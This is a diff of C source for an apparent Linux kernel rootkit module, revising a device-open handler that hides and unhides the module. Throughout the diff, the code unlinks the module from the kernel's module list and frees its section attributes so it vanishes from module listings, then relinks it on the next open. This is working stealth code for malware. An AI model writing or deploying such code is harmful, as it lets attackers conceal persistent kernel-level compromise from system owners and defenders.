@@ -49,19 +49,19 @@ void unhide(void)
 
 int dev_open_fops_for_hide(struct inode *inode, struct file* file)
 {
-    struct list_head module_list;
-    struct kobject* saved_kobj_parent;
-    module_list = THIS_MODULE->list;
-    saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent; 
+    struct list_head *module_list;
+    //struct kobject* saved_kobj_parent;
+    module_list = THIS_MODULE->list.prev;
+    //saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent; 
     if (!is_hide)
     {
         while (!mutex_trylock(&module_mutex))
             cpu_relax();
         list_del(&THIS_MODULE->list);
-        kobject_del(&THIS_MODULE->mkobj.kobj);
+        //kobject_del(&THIS_MODULE->mkobj.kobj);
         kfree(THIS_MODULE->sect_attrs);
-        kfree(THIS_MODULE->notes_attrs);
-        THIS_MODULE->notes_attrs = NULL;
+        //kfree(THIS_MODULE->notes_attrs);
+        //THIS_MODULE->notes_attrs = NULL;
         THIS_MODULE->sect_attrs = NULL;
         mutex_unlock(&module_mutex);
         is_hide = 1;
@@ -70,9 +70,9 @@ int dev_open_fops_for_hide(struct inode *inode, struct file* file)
     {
         while (!mutex_trylock(&module_mutex))
             cpu_relax();
-        list_add(&THIS_MODULE->list, &module_list);
-        kobject_add(&THIS_MODULE->mkobj.kobj ,saved_kobj_parent, "rt");
-        kobject_put(&THIS_MODULE->mkobj.kobj);
+        list_add(&THIS_MODULE->list, module_list);
+        //kobject_add(&THIS_MODULE->mkobj.kobj ,saved_kobj_parent, "rt");
+        //kobject_put(&THIS_MODULE->mkobj.kobj);
         mutex_unlock(&module_mutex);
         is_hide=0;
 
